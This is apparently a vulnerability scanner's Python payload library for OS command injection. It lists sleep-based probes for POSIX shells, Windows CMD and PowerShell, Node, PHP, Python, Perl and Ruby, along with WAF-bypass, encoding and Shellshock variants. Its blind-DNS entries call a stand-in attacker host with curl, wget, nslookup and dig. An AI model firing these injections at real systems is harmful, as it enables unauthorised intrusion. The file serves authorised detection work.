"""cmd_injection payload library — generated dev-time by Claude.

Each entry contains a payload template with {N} substituted at runtime
to a configurable sleep duration. The scanner sends two different N values
and confirms the response time matches — eliminates false positives from
slow endpoints. Use only payloads with `confirmable: True` for time-based
detection; the rest are for blind/OOB scanners.

Categories:
  - linux-shell    : POSIX shells (bash/sh/zsh/dash)
  - windows-cmd    : CMD.EXE and PowerShell
  - node-js        : Node child_process injection
  - php-cli        : PHP exec/passthru/system
  - python-cli     : Python subprocess injection
  - blind-dns      : Out-of-band DNS exfiltration (no time-based confirm)
  - encoded        : URL-encoded / hex / base64 obfuscation
  - waf-bypass     : Bypass common WAF filters
"""

CMD_PAYLOADS = [
  # ── Linux shell — semicolon separator ──
  {"name": "Linux semicolon", "payload": ";sleep {N}", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux semicolon space", "payload": "; sleep {N}", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux semicolon prefix", "payload": "x;sleep {N}", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},

  # ── Linux shell — pipe separator ──
  {"name": "Linux pipe", "payload": "|sleep {N}", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux pipe space", "payload": "| sleep {N}", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux double pipe", "payload": "||sleep {N}", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},

  # ── Linux shell — logical AND ──
  {"name": "Linux ampersand single", "payload": "&sleep {N}", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux ampersand double", "payload": "&&sleep {N}", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux logical AND space", "payload": "&& sleep {N}", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},

  # ── Linux shell — subshell ──
  {"name": "Linux subshell dollar", "payload": "$(sleep {N})", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux backtick", "payload": "`sleep {N}`", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux subshell suffix", "payload": "x$(sleep {N})", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},

  # ── Linux shell — newline ──
  {"name": "Linux newline (URL)", "payload": "%0asleep%20{N}", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux CRLF", "payload": "%0d%0asleep%20{N}", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},

  # ── Linux shell — IFS bypass (no-space) ──
  {"name": "Linux IFS bypass", "payload": ";sleep${IFS}{N}", "category": "waf-bypass", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux IFS9 bypass", "payload": ";sleep$IFS$9{N}", "category": "waf-bypass", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux tab IFS", "payload": ";sleep\t{N}", "category": "waf-bypass", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux brace bypass", "payload": ";{sleep,{N}}", "category": "waf-bypass", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},

  # ── Linux shell — wildcard / quote bypass ──
  {"name": "Linux quote bypass", "payload": ";sl''eep {N}", "category": "waf-bypass", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux escape bypass", "payload": ";s\\leep {N}", "category": "waf-bypass", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux wildcard /bin", "payload": ";/?in/sl??p {N}", "category": "waf-bypass", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux char-class glob", "payload": ";/[b]in/sleep {N}", "category": "waf-bypass", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},

  # ── Linux shell — closing tag / parenthesis breakouts ──
  {"name": "Linux close paren", "payload": ");sleep {N}", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux close paren && ", "payload": ")&&sleep {N}", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux close quote ;", "payload": "';sleep {N};'", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux close dquote ;", "payload": "\";sleep {N};\"", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},

  # ── Linux shell — exec-name escape ──
  {"name": "Linux /bin/sleep abs", "payload": ";/bin/sleep {N}", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux /usr/bin/sleep abs", "payload": ";/usr/bin/sleep {N}", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},

  # ── Windows CMD.EXE ──
  {"name": "Windows ampersand", "payload": "& timeout /T {N}", "category": "windows-cmd", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Windows logical AND", "payload": "&& timeout /T {N}", "category": "windows-cmd", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Windows pipe", "payload": "| timeout /T {N}", "category": "windows-cmd", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Windows newline", "payload": "%0atimeout%20/T%20{N}", "category": "windows-cmd", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Windows ping wait", "payload": "& ping -n {N} 127.0.0.1", "category": "windows-cmd", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Windows close-paren timeout", "payload": ") & timeout /T {N}", "category": "windows-cmd", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},

  # ── PowerShell ──
  {"name": "PowerShell Start-Sleep", "payload": ";Start-Sleep -s {N}", "category": "windows-cmd", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "PowerShell pipe sleep", "payload": "|Start-Sleep -s {N}", "category": "windows-cmd", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "PowerShell -Command", "payload": ";powershell -c \"Start-Sleep {N}\"", "category": "windows-cmd", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "PowerShell encoded", "payload": ";powershell -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAAewBOAH0A", "category": "encoded", "matcher": "TIME>{N}", "confirmable": False, "severity": "CRITICAL", "cvss": 9.8},

  # ── Node.js (child_process) ──
  {"name": "Node template literal", "payload": "${require('child_process').execSync('sleep {N}')}", "category": "node-js", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Node spawnSync", "payload": "');require('child_process').execSync('sleep {N}');//", "category": "node-js", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Node eval sleep", "payload": "');eval('require(\\'child_process\\').execSync(\\'sleep {N}\\')');//", "category": "node-js", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},

  # ── PHP CLI ──
  {"name": "PHP system semicolon", "payload": ";system('sleep {N}');", "category": "php-cli", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "PHP exec backtick", "payload": "`sleep {N}`", "category": "php-cli", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "PHP passthru", "payload": ";passthru('sleep {N}');", "category": "php-cli", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "PHP shell_exec", "payload": ";shell_exec('sleep {N}');", "category": "php-cli", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},

  # ── Python CLI ──
  {"name": "Python os.system", "payload": "__import__('os').system('sleep {N}')", "category": "python-cli", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Python subprocess", "payload": "__import__('subprocess').call(['sleep','{N}'])", "category": "python-cli", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Python eval", "payload": "');__import__('time').sleep({N});#", "category": "python-cli", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},

  # ── Blind / OOB DNS (no time confirm — for future OOB scanner) ──
  {"name": "Blind DNS curl", "payload": ";curl http://%RAND%.oob.attacker.example/", "category": "blind-dns", "matcher": "OOB", "confirmable": False, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Blind DNS wget", "payload": ";wget http://%RAND%.oob.attacker.example/", "category": "blind-dns", "matcher": "OOB", "confirmable": False, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Blind DNS nslookup", "payload": ";nslookup %RAND%.oob.attacker.example", "category": "blind-dns", "matcher": "OOB", "confirmable": False, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Blind DNS dig", "payload": ";dig %RAND%.oob.attacker.example", "category": "blind-dns", "matcher": "OOB", "confirmable": False, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Blind DNS host", "payload": ";host %RAND%.oob.attacker.example", "category": "blind-dns", "matcher": "OOB", "confirmable": False, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Blind DNS ping", "payload": ";ping -c1 %RAND%.oob.attacker.example", "category": "blind-dns", "matcher": "OOB", "confirmable": False, "severity": "CRITICAL", "cvss": 9.8},

  # ── URL-encoded ──
  {"name": "Encoded semicolon sleep", "payload": "%3Bsleep%20{N}", "category": "encoded", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Encoded pipe sleep", "payload": "%7Csleep%20{N}", "category": "encoded", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Double-encoded semicolon", "payload": "%253Bsleep%2520{N}", "category": "encoded", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Unicode semicolon", "payload": ";sleep {N}", "category": "encoded", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Hex-encoded subshell", "payload": "\\x24(sleep {N})", "category": "encoded", "matcher": "TIME>{N}", "confirmable": False, "severity": "CRITICAL", "cvss": 9.8},

  # ── WAF bypass — comments / null bytes ──
  {"name": "Null-byte bypass", "payload": ";sleep {N}%00", "category": "waf-bypass", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Comment-bash bypass", "payload": ";sleep {N}#", "category": "waf-bypass", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Variable expansion bypass", "payload": ";s\"\"leep {N}", "category": "waf-bypass", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Bash arithmetic bypass", "payload": ";$((sleep {N}))", "category": "waf-bypass", "matcher": "TIME>{N}", "confirmable": False, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Bash brace expansion", "payload": ";{,sleep,{N}}", "category": "waf-bypass", "matcher": "TIME>{N}", "confirmable": False, "severity": "CRITICAL", "cvss": 9.8},

  # ── User-Agent / Referer / Cookie context (header injection) ──
  {"name": "Header pipe sleep", "payload": "() { :; }; /bin/sleep {N}", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 10.0},
  {"name": "Shellshock function-def", "payload": "() { _; } >_[$($())] { sleep {N}; }", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 10.0},

  # ── Special targets — git / ImageMagick / FFmpeg known CVE shapes ──
  {"name": "ImageMagick MVG abuse", "payload": "image over 0,0 0,0 'label:`sleep {N}`'", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": False, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "FFmpeg HLS sleep", "payload": "concat:http://attacker/sleep_{N}.m3u8", "category": "linux-shell", "matcher": "OOB", "confirmable": False, "severity": "HIGH", "cvss": 8.5},

  # ── Bash -c flag — wrapper variants ──
  {"name": "bash -c semicolon", "payload": ";bash -c 'sleep {N}'", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "sh -c semicolon", "payload": ";sh -c 'sleep {N}'", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "/bin/sh -c", "payload": ";/bin/sh -c \"sleep {N}\"", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},

  # ── Pre/post-fix to break out of quoted shell args ──
  {"name": "Break dquote semicolon", "payload": "\";sleep {N};\"", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Break squote semicolon", "payload": "';sleep {N};'", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Break dquote backtick", "payload": "\"`sleep {N}`\"", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},

  # ── perl / ruby ──
  {"name": "Perl sleep", "payload": "';system(\"sleep {N}\");#", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Ruby system", "payload": "');system(\"sleep {N}\");#", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Ruby backtick string", "payload": "#{`sleep {N}`}", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},

  # ── Special encodings for filters ──
  {"name": "Tab + sleep", "payload": ";\tsleep {N}", "category": "waf-bypass", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "CR alone", "payload": "%0dsleep {N}", "category": "encoded", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Vertical tab", "payload": ";\x0bsleep {N}", "category": "waf-bypass", "matcher": "TIME>{N}", "confirmable": False, "severity": "CRITICAL", "cvss": 9.8},

  # ── Compound chain (post-fix terminator) ──
  {"name": "Chained sleep+true", "payload": ";sleep {N};true", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Chained sleep+echo", "payload": ";sleep {N};echo done", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
]
